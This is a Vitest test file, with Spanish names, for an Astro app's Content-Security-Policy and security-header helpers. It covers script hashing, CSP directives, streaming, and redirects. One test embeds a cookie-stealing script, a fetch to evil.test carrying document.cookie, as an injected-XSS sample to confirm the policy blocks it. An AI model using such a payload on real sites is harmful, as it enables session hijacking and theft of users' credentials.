import { createHash } from "node:crypto";
import { describe, expect, it } from "vitest";
import islaAstro from "astro/runtime/server/astro-island.prebuilt.js";
import directivaVisible from "astro/runtime/client/visible.prebuilt.js";
import {
  conHeadersDeSeguridad, construirCsp, cspDeLaApp, hashScript, HEADERS_FIJOS, SCRIPT_TEMA,
} from "../../../src/lib/security-headers";

const sha256 = (texto: string) => `sha256-${createHash("sha256").update(texto, "utf8").digest("base64")}`;

describe("hashScript", () => {
  it("coincide con el hash que calcula el navegador (UTF-8, con acentos y saltos de línea)", async () => {
    const script = "\n  document.title = 'Ñandú';\n";
    expect(await hashScript(script)).toBe(sha256(script));
  });
});

describe("cspDeLaApp", () => {
  it("autoriza el script del tema y los de hidratación de Astro", async () => {
    const csp = await cspDeLaApp();
    for (const script of [SCRIPT_TEMA, islaAstro, directivaVisible]) expect(csp).toContain(`'${sha256(script)}'`);
    expect(csp).not.toMatch(/script-src[^;]*unsafe-inline/);
  });
});

describe("construirCsp", () => {
  it("no permite scripts inline sin hash ni ser embebida en frames", () => {
    const csp = construirCsp([]);
    expect(csp).toContain("script-src 'self';");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'self'");
  });

  it("agrega cada hash entre comillas a script-src", () => {
    expect(construirCsp(["sha256-a", "sha256-b"])).toContain("script-src 'self' 'sha256-a' 'sha256-b';");
  });

  it("permite las fuentes de Google y los escudos remotos", () => {
    const csp = construirCsp([]);
    expect(csp).toContain("style-src 'self' 'unsafe-inline' https://fonts.googleapis.com");
    expect(csp).toContain("font-src 'self' https://fonts.gstatic.com");
    expect(csp).toContain("img-src 'self' data: https:");
  });
});

describe("conHeadersDeSeguridad", () => {
  it("HTML: headers fijos + CSP, sin tocar estado, cuerpo ni otros headers", async () => {
    const html = "<html><body>hola</body></html>";
    const res = await conHeadersDeSeguridad(
      new Response(html, { status: 404, headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" } })
    );
    expect(res.status).toBe(404);
    expect(await res.text()).toBe(html);
    expect(res.headers.get("Cache-Control")).toBe("no-store");
    for (const [nombre, valor] of Object.entries(HEADERS_FIJOS)) expect(res.headers.get(nombre)).toBe(valor);
    expect(res.headers.get("Content-Security-Policy")).toBe(await cspDeLaApp());
  });

  it("un <script> inyectado en el HTML no queda autorizado por la CSP", async () => {
    const inyectado = "fetch('https://evil.test/?c=' + document.cookie)";
    const res = await conHeadersDeSeguridad(
      new Response(`<p>Equipo</p><script>${inyectado}</script>`, { headers: { "Content-Type": "text/html" } })
    );
    expect(res.headers.get("Content-Security-Policy")).not.toContain(sha256(inyectado));
  });

  it("no espera el cuerpo: el HTML sigue saliendo en streaming", async () => {
    let cerrar!: () => void;
    const cuerpo = new ReadableStream<Uint8Array>({
      start(c) {
        c.enqueue(new TextEncoder().encode("<html>"));
        cerrar = () => c.close();
      },
    });
    const res = await conHeadersDeSeguridad(new Response(cuerpo, { headers: { "Content-Type": "text/html" } }));
    expect(res.headers.has("Content-Security-Policy")).toBe(true);
    cerrar();
    expect(await res.text()).toBe("<html>");
  });

  it("respuestas sin cuerpo (304 con Content-Type HTML, 204)", async () => {
    const r304 = await conHeadersDeSeguridad(new Response(null, { status: 304, headers: { "Content-Type": "text/html" } }));
    expect(r304.status).toBe(304);
    expect(r304.body).toBeNull();
    const r204 = await conHeadersDeSeguridad(new Response(null, { status: 204 }));
    expect(r204.status).toBe(204);
    expect(r204.headers.get("X-Frame-Options")).toBe("DENY");
  });

  it("JSON: headers fijos y el cuerpo intacto; sin CSP si se pide (astro dev)", async () => {
    const res = await conHeadersDeSeguridad(Response.json({ error: "Unauthorized" }, { status: 401 }), false);
    expect(res.status).toBe(401);
    expect(await res.json()).toEqual({ error: "Unauthorized" });
    expect(res.headers.get("X-Content-Type-Options")).toBe("nosniff");
    expect(res.headers.has("Content-Security-Policy")).toBe(false);
  });

  it("redirecciones (headers inmutables): conserva Location", async () => {
    const res = await conHeadersDeSeguridad(Response.redirect("https://fisture.test/login", 302));
    expect(res.status).toBe(302);
    expect(res.headers.get("Location")).toBe("https://fisture.test/login");
    expect(res.headers.get("X-Frame-Options")).toBe("DENY");
  });
});
